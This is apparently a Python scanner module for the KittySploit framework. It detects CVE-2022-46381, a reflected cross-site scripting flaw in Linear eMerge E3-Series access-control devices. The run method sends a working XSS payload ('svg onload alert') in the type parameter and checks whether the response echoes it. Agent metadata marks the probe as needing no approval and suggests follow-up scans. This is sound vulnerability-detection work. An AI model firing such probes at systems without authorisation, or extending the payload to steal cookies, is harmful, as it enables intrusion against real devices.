#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Linear eMerge E3-Series devices contain a cross-site scripting vulnerability via the type parameter, e."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Linear eMerge E3-Series - Cross-Site Scripting Detection',
        'description': 'Linear eMerge E3-Series devices contain a cross-site scripting vulnerability via the type parameter, e.g., to the badging/badge_template_v0.php component. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site and thus steal cookie-based authentication credentials and launch other attacks. This affects versions 0.32-08f, 0.32-07p, 0.32-07e, 0.32-09c, 0.32-09b, 0.32-09a, and 0.32-08e.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'emerge', 'linear', 'niceforyou', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-46381',
            'https://github.com/omarhashem123/Security-Research/blob/main/CVE-2022-46381/CVE-2022-46381.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-46381',
            'https://github.com/amitlttwo/CVE-2022-46381',
            'https://github.com/k0mi-tg/CVE-POC',
        ],
        'cve': 'CVE-2022-46381',
    }

    def run(self):
        r = self.http_request(method="GET", path='/badging/badge_template_v0.php?layout=1&type="/><svg/onload="alert(document.domain)"/>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<svg/onload="alert(document.domain)"/>', 'Badging Template',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Linear eMerge E3-Series - Cross-Site Scripting detected",
                path='/badging/badge_template_v0.php?layout=1&type="/><svg/onload="alert(document.domain)"/>',
            )
            return True
        return False

